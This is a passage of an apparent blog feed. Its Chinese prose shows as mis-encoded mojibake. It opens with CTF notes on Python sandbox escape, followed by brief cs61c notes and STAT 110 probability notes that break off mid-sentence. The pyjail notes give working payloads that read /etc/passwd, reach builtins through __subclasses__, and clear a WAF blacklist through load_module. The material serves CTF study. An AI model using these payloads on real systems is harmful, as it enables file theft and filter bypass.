class="literal">None</span>)()</span><br></pre></td></tr></table></figure></li><li><p>è°ƒç”¨å‡½æ•°ä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨ <code>eval</code> æˆ–è€…<code> exec</code></p></li></ol><h3 id="è¯»å†™æ–‡ä»¶"><a href="#è¯»å†™æ–‡ä»¶" class="headerlink" title="è¯»å†™æ–‡ä»¶"></a>è¯»å†™æ–‡ä»¶</h3><h4 id="file"><a href="#file" class="headerlink" title="file"></a><code>file</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Python2</span></span><br><span class="line">file(<span class="string">&#x27;test.txt&#x27;</span>).read()</span><br><span class="line"><span class="comment">#æ³¨æ„ï¼šè¯¥å‡½æ•°åªå­˜åœ¨äºPython2ï¼ŒPython3ä¸å­˜åœ¨</span></span><br></pre></td></tr></table></figure><h4 id="open"><a href="#open" class="headerlink" title="open"></a><code>open</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br><span class="line">__builtins__[<span class="string">&#x27;open&#x27;</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&quot;builtins&quot;</span>).<span class="built_in">open</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br></pre></td></tr></table></figure><h4 id="codecs"><a href="#codecs" class="headerlink" title="codecs"></a><code>codecs</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line">codecs.<span class="built_in">open</span>(<span class="string">&#x27;test.txt&#x27;</span>).read()</span><br></pre></td></tr></table></figure><h4 id="get-data"><a href="#get-data" class="headerlink" title="get_data"></a><code>get_data</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># _frozen_importlib_external.FileLoader.get_data(0,&lt;filename&gt;)</span></span><br><span class="line"><span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">91</span>].get_data(<span class="number">0</span>,<span class="string">&quot;app.py&quot;</span>)</span><br></pre></td></tr></table></figure><p>ç›¸æ¯”äºè·å– <code>__builtins__</code> å†ä½¿ç”¨ <code>open</code> å»è¿›è¡Œè¯»å–,ä½¿ç”¨ <code>get_data</code> çš„ payload æ›´çŸ­.</p><h4 id="linecache-getlines"><a href="#linecache-getlines" class="headerlink" title="linecache.getlines"></a><code>linecache.getlines</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> linecache</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>linecache.getlines(<span class="string">&#x27;/etc/passwd&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">__import__</span>(<span class="string">&quot;linecache&quot;</span>).getlines(<span class="string">&#x27;/etc/passwd&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="lisense"><a href="#lisense" class="headerlink" title="lisense"></a><code>lisense</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.__dict__[<span class="string">&quot;license&quot;</span>]._Printer__filenames=[<span class="string">&quot;/etc/passwd&quot;</span>]</span><br><span class="line">a = __builtins__.<span class="built_in">help</span></span><br><span class="line">a.__class__.__enter__ = __builtins__.__dict__[<span class="string">&quot;license&quot;</span>]</span><br><span class="line">a.__class__.__exit__ = <span class="keyword">lambda</span> <span class="variable language_">self</span>, *args: <span class="literal">None</span></span><br><span class="line"><span class="keyword">with</span> (a <span class="keyword">as</span> b):</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h3 id="æšä¸¾ç›®å½•"><a href="#æšä¸¾ç›®å½•" class="headerlink" title="æšä¸¾ç›®å½•"></a>æšä¸¾ç›®å½•</h3><h4 id="os-listdir"><a href="#os-listdir" class="headerlink" title="os.listdir"></a><code>os.listdir</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.listdir(<span class="string">&quot;/&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).listdir(<span class="string">&#x27;/&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="glob"><a href="#glob" class="headerlink" title="glob"></a><code>glob</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> glob</span><br><span class="line">glob.glob(<span class="string">&quot;f*&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;glob&#x27;</span>).glob(<span class="string">&quot;f*&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="è·å–å‡½æ•°ä¿¡æ¯"><a href="#è·å–å‡½æ•°ä¿¡æ¯" class="headerlink" title="è·å–å‡½æ•°ä¿¡æ¯"></a>è·å–å‡½æ•°ä¿¡æ¯</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag</span>(<span class="params">some_input</span>):</span><br><span class="line">    var1=<span class="number">1</span></span><br><span class="line">    var2=<span class="string">&quot;secretcode&quot;</span></span><br><span class="line">    var3=[<span class="string">&quot;some&quot;</span>,<span class="string">&quot;array&quot;</span>]</span><br><span class="line">    <span class="keyword">if</span> some_input == var2:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;THIS-IS-THE-FALG!&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Nope&quot;</span></span><br></pre></td></tr></table></figure><h4 id="è·å–æºä»£ç ä¸­çš„å¸¸é‡"><a href="#è·å–æºä»£ç ä¸­çš„å¸¸é‡" class="headerlink" title="è·å–æºä»£ç ä¸­çš„å¸¸é‡"></a>è·å–æºä»£ç ä¸­çš„å¸¸é‡</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>get_flag.__code__.co_consts</span><br><span class="line">(<span class="literal">None</span>, <span class="number">1</span>, <span class="string">&#x27;secretcode&#x27;</span>, <span class="string">&#x27;some&#x27;</span>, <span class="string">&#x27;array&#x27;</span>, <span class="string">&#x27;THIS-IS-THE-FALG!&#x27;</span>, <span class="string">&#x27;Nope&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="è·å–æºä»£ç ä¸­çš„å˜é‡"><a href="#è·å–æºä»£ç ä¸­çš„å˜é‡" class="headerlink" title="è·å–æºä»£ç ä¸­çš„å˜é‡"></a>è·å–æºä»£ç ä¸­çš„å˜é‡</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__globals__</span><br><span class="line"></span><br><span class="line">get_flag.__globals__</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>get_flag.__code__.co_varnames</span><br><span class="line">(<span class="string">&#x27;some_input&#x27;</span>, <span class="string">&#x27;var1&#x27;</span>, <span class="string">&#x27;var2&#x27;</span>, <span class="string">&#x27;var3&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="å­—èŠ‚ç åºåˆ—"><a href="#å­—èŠ‚ç åºåˆ—" class="headerlink" title="å­—èŠ‚ç åºåˆ—"></a>å­—èŠ‚ç åºåˆ—</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>get_flag.__code__.co_code</span><br><span class="line"><span class="string">b&#x27;\x97\x00d\x01&#125;\x01d\x02&#125;\x02d\x03d\x04g\x02&#125;\x03|\x00|\x02k\x02\x00\x00\x00\x00r\x02d\x05S\x00d\x06S\x00&#x27;</span></span><br></pre></td></tr></table></figure><p>using dis module</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>bytecode = get_flag.__code__.co_code</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dis.dis(bytecode)</span><br><span class="line">          <span class="number">0</span> RESUME                   <span class="number">0</span></span><br><span class="line">          <span class="number">2</span> LOAD_CONST               <span class="number">1</span></span><br><span class="line">          <span class="number">4</span> STORE_FAST               <span class="number">1</span></span><br><span class="line">          <span class="number">6</span> LOAD_CONST               <span class="number">2</span></span><br><span class="line">          <span class="number">8</span> STORE_FAST               <span class="number">2</span></span><br><span class="line">         <span class="number">10</span> LOAD_CONST               <span class="number">3</span></span><br><span class="line">         <span class="number">12</span> LOAD_CONST               <span class="number">4</span></span><br><span class="line">         <span class="number">14</span> BUILD_LIST               <span class="number">2</span></span><br><span class="line">         <span class="number">16</span> STORE_FAST               <span class="number">3</span></span><br><span class="line">         <span class="number">18</span> LOAD_FAST                <span class="number">0</span></span><br><span class="line">         <span class="number">20</span> LOAD_FAST                <span class="number">2</span></span><br><span class="line">         <span class="number">22</span> COMPARE_OP               <span class="number">2</span> (==)</span><br><span class="line">         <span class="number">28</span> POP_JUMP_FORWARD_IF_FALSE     <span class="number">2</span> (to <span class="number">34</span>)</span><br><span class="line">         <span class="number">30</span> LOAD_CONST               <span class="number">5</span></span><br><span class="line">         <span class="number">32</span> RETURN_VALUE</span><br><span class="line">    &gt;&gt;   <span class="number">34</span> LOAD_CONST               <span class="number">6</span></span><br><span class="line">         <span class="number">36</span> RETURN_VALUE</span><br></pre></td></tr></table></figure><p>é€šè¿‡ <code>dis.disassemble</code> è·å–æ›´æ¸…æ™°çš„è¡¨ç¤º</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>bytecode = get_flag.__code__</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dis.disassemble(bytecode)</span><br><span class="line">  <span class="number">1</span>           <span class="number">0</span> RESUME                   <span class="number">0</span></span><br><span class="line"></span><br><span class="line">  <span class="number">2</span>           <span class="number">2</span> LOAD_CONST               <span class="number">1</span> (<span class="number">1</span>)</span><br><span class="line">              <span class="number">4</span> STORE_FAST               <span class="number">1</span> (var1)</span><br><span class="line"></span><br><span class="line">  <span class="number">3</span>           <span class="number">6</span> LOAD_CONST               <span class="number">2</span> (<span class="string">&#x27;secretcode&#x27;</span>)</span><br><span class="line">              <span class="number">8</span> STORE_FAST               <span class="number">2</span> (var2)</span><br><span class="line"></span><br><span class="line">  <span class="number">4</span>          <span class="number">10</span> LOAD_CONST               <span class="number">3</span> (<span class="string">&#x27;some&#x27;</span>)</span><br><span class="line">             <span class="number">12</span> LOAD_CONST               <span class="number">4</span> (<span class="string">&#x27;array&#x27;</span>)</span><br><span class="line">             <span class="number">14</span> BUILD_LIST               <span class="number">2</span></span><br><span class="line">             <span class="number">16</span> STORE_FAST               <span class="number">3</span> (var3)</span><br><span class="line"></span><br><span class="line">  <span class="number">5</span>          <span class="number">18</span> LOAD_FAST                <span class="number">0</span> (some_input)</span><br><span class="line">             <span class="number">20</span> LOAD_FAST                <span class="number">2</span> (var2)</span><br><span class="line">             <span class="number">22</span> COMPARE_OP               <span class="number">2</span> (==)</span><br><span class="line">             <span class="number">28</span> POP_JUMP_FORWARD_IF_FALSE     <span class="number">2</span> (to <span class="number">34</span>)</span><br><span class="line"></span><br><span class="line">  <span class="number">6</span>          <span class="number">30</span> LOAD_CONST               <span class="number">5</span> (<span class="string">&#x27;THIS-IS-THE-FALG!&#x27;</span>)</span><br><span class="line">             <span class="number">32</span> RETURN_VALUE</span><br><span class="line"></span><br><span class="line">  <span class="number">8</span>     &gt;&gt;   <span class="number">34</span> LOAD_CONST               <span class="number">6</span> (<span class="string">&#x27;Nope&#x27;</span>)</span><br><span class="line">             <span class="number">36</span> RETURN_VALUE</span><br></pre></td></tr></table></figure><h3 id="è·å–ç¯å¢ƒä¿¡æ¯"><a href="#è·å–ç¯å¢ƒä¿¡æ¯" class="headerlink" title="è·å–ç¯å¢ƒä¿¡æ¯"></a>è·å–ç¯å¢ƒä¿¡æ¯</h3><h4 id="è·å–-python-ç‰ˆæœ¬"><a href="#è·å–-python-ç‰ˆæœ¬" class="headerlink" title="è·å– python ç‰ˆæœ¬"></a>è·å– python ç‰ˆæœ¬</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.version</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> platform</span><br><span class="line">platform.python_version()</span><br></pre></td></tr></table></figure><h4 id="è·å–-Linux-ç‰ˆæœ¬"><a href="#è·å–-Linux-ç‰ˆæœ¬" class="headerlink" title="è·å– Linux ç‰ˆæœ¬"></a>è·å– Linux ç‰ˆæœ¬</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> platform</span><br><span class="line">platform.uname()</span><br></pre></td></tr></table></figure><h4 id="è·å–è·¯å¾„"><a href="#è·å–è·¯å¾„" class="headerlink" title="è·å–è·¯å¾„"></a>è·å–è·¯å¾„</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sys.path</span><br><span class="line">sys.modules</span><br></pre></td></tr></table></figure><h3 id="è·å–å…¨å±€å˜é‡"><a href="#è·å–å…¨å±€å˜é‡" class="headerlink" title="è·å–å…¨å±€å˜é‡"></a>è·å–å…¨å±€å˜é‡</h3><h4 id="globals-1"><a href="#globals-1" class="headerlink" title="globals()"></a><code>globals()</code></h4><h4 id="help-2"><a href="#help-2" class="headerlink" title="help()"></a><code>help()</code></h4><p><code>help</code> å‡½æ•°ä¹Ÿå¯ä»¥è·å–æŸä¸ªæ¨¡å—çš„å¸®åŠ©ä¿¡æ¯ï¼ŒåŒ…æ‹¬å…¨å±€å˜é‡, è¾“å…¥ <code>__main__</code> ä¹‹åå¯ä»¥è·å–å½“å‰æ¨¡å—çš„ä¿¡æ¯ã€‚</p><h4 id="vars-1"><a href="#vars-1" class="headerlink" title="vars()"></a><code>vars()</code></h4><p><code>vars()</code> å‡½æ•°è¿”å›è¯¥å¯¹è±¡çš„å‘½åç©ºé—´ï¼ˆnamespaceï¼‰ä¸­çš„æ‰€æœ‰å±æ€§ä»¥å­—å…¸çš„å½¢å¼è¡¨ç¤ºã€‚å½“å‰æ¨¡å—çš„æ‰€æœ‰å˜é‡ä¹Ÿä¼šåŒ…å«åœ¨é‡Œé¢ï¼Œä¸€äº›è¿‡æ»¤é“¾ <code>globals</code> å’Œ <code>help</code> å‡½æ•°çš„åœºæ™¯å¯ä»¥å°è¯•ä½¿ç”¨ <code>vars()</code></p><h3 id="è·å–æ¨¡å—å†…éƒ¨å‡½æ•°æˆ–å˜é‡"><a href="#è·å–æ¨¡å—å†…éƒ¨å‡½æ•°æˆ–å˜é‡" class="headerlink" title="è·å–æ¨¡å—å†…éƒ¨å‡½æ•°æˆ–å˜é‡"></a>è·å–æ¨¡å—å†…éƒ¨å‡½æ•°æˆ–å˜é‡</h3><h4 id="è·å–æŒ‡å®šæ¨¡å—å†…éƒ¨å˜é‡"><a href="#è·å–æŒ‡å®šæ¨¡å—å†…éƒ¨å˜é‡" class="headerlink" title="è·å–æŒ‡å®šæ¨¡å—å†…éƒ¨å˜é‡"></a>è·å–æŒ‡å®šæ¨¡å—å†…éƒ¨å˜é‡</h4><p>è·å–æ¨¡å—å†…éƒ¨å‡½æ•°æˆ–å˜é‡çš„ç›®çš„ä¸»è¦æ˜¯ä¸ºäº†ä¿¡æ¯æ³„éœ²æˆ–ç¯¡æ”¹ã€‚æ¯”å¦‚ waf.py ä¸­å­˜åœ¨æŸä¸ªå˜é‡å®šä¹‰äº†å±é™©å­—ç¬¦åˆ—è¡¨ï¼Œæˆ‘ä»¬å¯ä»¥è€ƒè™‘å…ˆè·å–è¿™ä¸ªå˜é‡ç„¶åå°†å…¶æ¸…ç©ºã€‚</p><p>å¯ä»¥å…ˆè·å– load_moduleï¼Œç„¶åé€šè¿‡ load_module å¯¼å…¥ç‰¹å®šçš„æ¨¡å—ï¼Œè¿›è€Œç¯¡æ”¹å…¶ä¸­å˜é‡ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">list</span>(().__class__.__bases__.__iter__().__next__().__subclasses__().__getitem__(<span class="number">84</span>).load_module(<span class="string">&quot;waf&quot;</span>).__dict__.values()).__getitem__(<span class="number">8</span>).clear()</span><br></pre></td></tr></table></figure><h4 id="è·å–-main-ä¸­å˜é‡"><a href="#è·å–-main-ä¸­å˜é‡" class="headerlink" title="è·å– __main__ ä¸­å˜é‡"></a>è·å– <code>__main__</code> ä¸­å˜é‡</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sys.modules[<span class="string">&#x27;__main__&#x27;</span>].__dict__[<span class="string">&#x27;app&#x27;</span>]</span><br></pre></td></tr></table></figure><h4 id="è·å–å‘½ä»¤ç©ºé—´ä¸­çš„å˜é‡-æ¨¡å—-å‡½æ•°ç­‰"><a href="#è·å–å‘½ä»¤ç©ºé—´ä¸­çš„å˜é‡-æ¨¡å—-å‡½æ•°ç­‰" class="headerlink" title="è·å–å‘½ä»¤ç©ºé—´ä¸­çš„å˜é‡&#x2F;æ¨¡å—&#x2F;å‡½æ•°ç­‰"></a>è·å–å‘½ä»¤ç©ºé—´ä¸­çš„å˜é‡&#x2F;æ¨¡å—&#x2F;å‡½æ•°ç­‰</h4><p><code>__globals__</code>æ˜¯ä¸€ä¸ªç‰¹æ®Šå±æ€§ï¼Œèƒ½å¤Ÿä»¥ dict çš„å½¢å¼è¿”å›å‡½æ•°ï¼ˆæ³¨æ„æ˜¯å‡½æ•°ï¼‰æ‰€åœ¨æ¨¡å—å‘½åç©ºé—´çš„æ‰€æœ‰å˜é‡ï¼Œå…¶ä¸­åŒ…å«äº†å¾ˆå¤šå·²ç»å¼•å…¥çš„ modulesã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;request&#x27;</span>]</span><br><span class="line">url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]</span><br></pre></td></tr></table></figure><h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><ul><li><a href="https://dummykitty.github.io/posts/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%8E%9F%E7%90%86/">pyjail åˆé›†</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> pyjail </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cs61c-su25 diary</title>
      <link href="/2025/08/13/cs61c-su25-diary/"/>
      <url>/2025/08/13/cs61c-su25-diary/</url>
      
        <content type="html"><![CDATA[<h1 id="cs61c-su25-å­¦ä¹ ç¬”è®°"><a href="#cs61c-su25-å­¦ä¹ ç¬”è®°" class="headerlink" title="cs61c-su25 å­¦ä¹ ç¬”è®°"></a>cs61c-su25 å­¦ä¹ ç¬”è®°</h1><h2 id="ç¯å¢ƒé…ç½®"><a href="#ç¯å¢ƒé…ç½®" class="headerlink" title="ç¯å¢ƒé…ç½®"></a>ç¯å¢ƒé…ç½®</h2><h2 id="c-åŸºæœ¬çŸ¥è¯†"><a href="#c-åŸºæœ¬çŸ¥è¯†" class="headerlink" title="c åŸºæœ¬çŸ¥è¯†"></a>c åŸºæœ¬çŸ¥è¯†</h2><ul><li><code>gcc -o &lt;output_file&gt; &lt;source_file.c&gt;</code> å¯ä»¥å°† C æºæ–‡ä»¶ç¼–è¯‘æˆå¯æ‰§è¡Œæ–‡ä»¶ã€‚</li><li>When performing pointer arithmetic, C automatically accounts for the type of the pointer and adds the correct number of bytes.</li></ul>]]></content>
      
      
      <categories>
          
          <category> cs61c </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ“ä½œç³»ç»Ÿ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ¦‚ç‡è®ºå°ç»“</title>
      <link href="/2025/08/13/%E6%A6%82%E7%8E%87%E8%AE%BA%E5%B0%8F%E7%BB%93/"/>
      <url>/2025/08/13/%E6%A6%82%E7%8E%87%E8%AE%BA%E5%B0%8F%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="STAT-110-â€“-Probability-Study-Notes-Rewritten-Structured"><a href="#STAT-110-â€“-Probability-Study-Notes-Rewritten-Structured" class="headerlink" title="STAT 110 â€“ Probability Study Notes (Rewritten &amp; Structured)"></a>STAT 110 â€“ Probability Study Notes (Rewritten &amp; Structured)</h1><blockquote><p>Goal: a compact, examâ€‘ready set of notes that are <strong>wellâ€‘scaffolded</strong>, <strong>exampleâ€‘driven</strong>, and <strong>correct by construction</strong>. Each section includes: <em>What it is</em>, <em>Key facts</em>, <em>Common pitfalls</em>, and <em>Oneâ€‘liner examples</em>.</p></blockquote><hr><h2 id="0-Quick-Roadmap-What-to-use-when"><a href="#0-Quick-Roadmap-What-to-use-when" class="headerlink" title="0. Quick Roadmap (What to use when)"></a>0. Quick Roadmap (What to use when)</h2><ul><li><strong>Counting &amp; NaÃ¯ve probability</strong> â†’ uniform sample spaces.</li><li><strong>Conditioning &amp; Bayes</strong> â†’ update beliefs, tree&#x2F;partition problems, Monty Hall.</li><li><strong>Discrete RVs</strong> â†’ Bernoulli&#x2F;Binomial&#x2F;Hypergeometric&#x2F;Geometric&#x2F;NegBin&#x2F;Poisson.</li><li><strong>Continuous RVs</strong> â†’ Uniform&#x2F;Exponential&#x2F;Normal&#x2F;Logistic; LOTUS &amp; transforms.</li><li><strong>Joint&#x2F;Independence</strong> â†’ marginals, covariance&#x2F;correlation, convolution.</li><li><strong>MGF&#x2F;CGF</strong> â†’ sums of independent variables; identify distributions.</li><li><strong>Inequalities &amp; LLN&#x2F;CLT</strong> â†’ tail control, approximations.</li><li><strong>Order stats</strong> â†’ minima&#x2F;maxima &amp; quantiles.</li><li><strong>Offshoots of Normal</strong> â†’ Ï‡Â², t, F; Beta&#x2F;Gamma conjugacies.</li><li><strong>Markov chains</strong> â†’ transitions, stationary, reversibility.</li><li><strong>Sampling&#x2F;IPW</strong> â†’ Horvitzâ€“Thompson, when weights help&#x2F;hurt variance.</li></ul><hr><h2 id="1-Probability-Foundations"><a href="#1-Probability-Foundations" class="headerlink" title="1. Probability Foundations"></a>1. Probability Foundations</h2><h3 id="1-1-Sample-space-events-axioms"><a href="#1-1-Sample-space-events-axioms" class="headerlink" title="1.1 Sample space, events, axioms"></a>1.1 Sample space, events, axioms</h3><ul><li><strong>Sample space</strong> $\Omega$; <strong>event</strong> $A\subseteq\Omega$; <strong>probability</strong> $P$.</li><li><strong>Additivity</strong>: disjoint $A_i$: $P(\cup_i A_i)&#x3D;\sum_i P(A_i)$.</li><li><strong>Complement</strong>: $P(A^c)&#x3D;1-P(A)$.</li></ul><h3 id="1-2-Counting-uniform-models"><a href="#1-2-Counting-uniform-models" class="headerlink" title="1.2 Counting (uniform models)"></a>1.2 Counting (uniform models)</h3><ul><li><strong>Permutations</strong>: $P(n,k)&#x3D;n!&#x2F;(n-k)!$.</li><li><strong>Combinations</strong>: $\binom{n}{k}&#x3D;n!&#x2F;(k!(n-k)!)$.</li><li><strong>Vandermonde</strong>: $\sum_k \binom{m}{k}\binom{n}{r-k}&#x3D;\binom{m+n}{r}$.</li></ul><p><strong>Pitfalls:</strong> forgetting whether order matters; mixing with&#x2F;without replacement.</p><p><strong>Tiny check:</strong> cards without order, no replacement â†’ combinations.</p><hr><h2 id="2-Conditioning-Bayes-and-Total-Probability"><a href="#2-Conditioning-Bayes-and-Total-Probability" class="headerlink" title="2. Conditioning, Bayes, and Total Probability"></a>2. Conditioning, Bayes, and Total Probability</h2><ul><li><strong>Conditional</strong>: $P(A\mid B)&#x3D;\tfrac{P(AB)}{P(B)}$ if $P(B)&gt;0$.</li><li><strong>Law of total probability (partition $A_i$)</strong>: $P(B)&#x3D;\sum_i P(B\mid A_i)P(A_i)$.</li><li><strong>Bayes</strong>: $P(A_i\mid B)&#x3D;\tfrac{P(B\mid A_i)P(A_i)}{\sum_j P(B\mid A_j)P(A_j)}$.</li><li><strong>Independence</strong>: $A\perp B\iff P(AB)&#x3D;P(A)P(B)$. <em>Conditional independence</em> is <strong>not</strong> implied by independence and viceâ€‘versa.</li></ul><p><strong>Monty Hall (sketch):</strong> Prior: car behind 1&#x2F;3 each. Host opens goat door. Posterior: stay&#x3D;1&#x2F;3, switch&#x3D;2&#x2F;3. (Condition on hostâ€™s policy; use LOTP on host action.)</p><p><strong>Pitfall:</strong> treating conditional independence as independence.</p><hr><h2 id="3-Random-Variables-RVs"><a href="#3-Random-Variables-RVs" class="headerlink" title="3. Random Variables (RVs)"></a>3. Random Variables (RVs)</h2><p>A random variable is a measurable function $X: \Omega\to\mathbb R$.</p><h3 id="3-1-Discrete-basics"><a href="#3-1-Discrete-basics" class="headerlink" title="3.1 Discrete basics"></a>3.1 Discrete basics</h3><ul><li><strong>PMF</strong> $p_X(x)&#x3D;P(X&#x3D;x)$; <strong>CDF</strong> $F_X(x)&#x3D;P(X\le x)$.</li><li><strong>Expectation</strong> $E[X]&#x3D;\sum_x x,p_X(x)$. <strong>Variance</strong> $\operatorname{Var}(X)&#x3D;E[X^2]-E[X]^2$.</li><li><strong>Linearity</strong>: $E[\sum_i a_i X_i]&#x3D;\sum_i a_i E[X_i]$ (no independence needed).</li></ul><h4 id="Canonical-discrete-families"><a href="#Canonical-discrete-families" class="headerlink" title="Canonical discrete families"></a>Canonical discrete families</h4><ul><li><strong>Bernoulli</strong> $\mathrm{Ber}(p)$: $E&#x3D;p,\ Var&#x3D;p(1-p)$.</li><li><strong>Binomial</strong> $\mathrm{Bin}(n,p)$: $P(X&#x3D;k)&#x3D;\binom{n}{k}p^k(1-p)^{n-k}$. Sum of iid Bernoullis. Additivity: $\mathrm{Bin}(n,p)+\mathrm{Bin}(m,p)&#x3D;\mathrm{Bin}(n+m,p)$ if independent.</li><li><strong>Hypergeometric</strong> $\mathrm{Hyp}(N,K,n)$: sampling w&#x2F;o replacement; $\operatorname{Var}&#x3D;\frac{N-n}{N-1}np(1-p)$ with $p&#x3D;K&#x2F;N$.</li><li><strong>Geometric</strong> (failures before first success): $P(X&#x3D;k)&#x3D;q^k p$, $E&#x3D;\tfrac{1}{p}$.</li><li><strong>Negative Binomial</strong> (failures before $r$ th success): $P(X&#x3D;n)&#x3D;\binom{n+r-1}{r-1}p^r(1-p)^n$.</li><li><strong>Poisson($\lambda$)</strong>: $P(X&#x3D;k)&#x3D;e^{-\lambda}\lambda^k&#x2F;k!$, $E&#x3D;\lambda&#x3D;\operatorname{Var}$. Additivity for independent Poissons.</li></ul><p><strong>Poisson Paradigm:</strong> many rare, nearly independent trials â†’ count $\approx$ Poisson with $\lambda&#x3D;\sum_i p_i$.</p><p><strong>Pitfall:</strong> Using Binomial 